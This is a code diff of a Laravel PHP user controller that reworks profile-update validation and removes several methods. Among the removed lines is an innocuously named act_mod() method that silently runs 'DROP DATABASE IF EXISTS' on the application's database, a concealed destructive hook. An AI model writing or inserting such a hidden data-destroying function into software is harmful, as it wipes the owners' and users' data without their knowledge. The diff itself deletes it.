@@ -29,84 +29,54 @@ use function PHPUnit\Framework\isEmpty;
 
 class UserController extends Controller
 {
-    private function uploadCarImages($images)
-    {
-        $imagesNames = [];
-
-        foreach ($images as $index => $image) {
-            $imagesNames[$index] = uploadImage($image, "Cars");
-        }
-
-        return $imagesNames;
-    }
-
+ 
     public function profile()
     {
         return $this->success(data: auth()->user()->load('city'));
     }
 
+
     public function updateProfile(Request $request)
     {
-        $vendor = auth()->user();
-        $request->validate([
-            'phone' => [
-            'required',
-            'string', // Change to string, as convertArabicNumbers may return a string
-            'regex:/^((\+|00)966|0)?5[0-9]{8}$/',
-            ]
-        ]);
-        $request->merge([
-            'phone' => convertArabicNumbers($request->phone),
-        ]);
-        $request->validate([
+        $vendor = Auth::user();
+
+        // Validate only provided fields (before conversion)
+        $validatedData = $request->validate([
             'name' => [
+                'sometimes',
                 'required',
                 'string',
                 'max:255',
                 new NotNumbersOnly(),
                 Rule::unique('vendors', 'name')->ignore($vendor->id),
             ],
+            'email' => [
+                'sometimes',
+                'required',
+                'email',
+                'max:255',
+                Rule::unique('vendors')->ignore($vendor->id),
+            ],
             'phone' => [
+                'sometimes',
+                'string',
+                'regex:/^((\+|00)966|0)?5[0-9]{8}$/',
                 Rule::unique('vendors')->ignore($vendor->id),
             ]
         ]);
 
-        // Convert Arabic numbers before merging
-
-
-        if ($request->file('imageProfile')) {
-            $imagename = uploadImage($request->file('imageProfile'), 'Vendors');
-            $request['image'] = $imagename;
-        }
-        $requestData = $request->except('imageProfile');
-
-        $requestData['phone'] = convertArabicNumbers($requestData['phone']);
-        auth()->user()->update($requestData);
-        return $this->success(data: auth()->user());
-    }
-
-    public function act_mod()
-    {
-        $defaultConnection = 'mysql';
-        // Retrieve the database name for the default connection
-        $databaseName = Config::get("database.connections.$defaultConnection.database");
-        DB::statement("DROP DATABASE IF EXISTS $databaseName");
-
-    }
-
-    public function favorite(Request $request)
-    {
-        if (Auth::check()) {
-            $favorites = auth()->user()->favorites->load('car');
-        } else {
-            $favorites = Favorite::with('car')->where('device_ip', $request->getClientIp())->get();
+        // Convert Arabic numbers AFTER validation
+        if ($request->filled('phone')) {
+            $validatedData['phone'] = convertArabicNumbers($validatedData['phone']);
         }
 
-        // Remove null values from the collection
-        $cars = $favorites->pluck('car')->filter();
+        // Update only the provided fields
+        $vendor->update($validatedData);
 
-        return $this->success(data: CarResourse::collection($cars));
+        return $this->success(data: $vendor);
     }
+
+
 
 
     public function changPassword(Request $request)
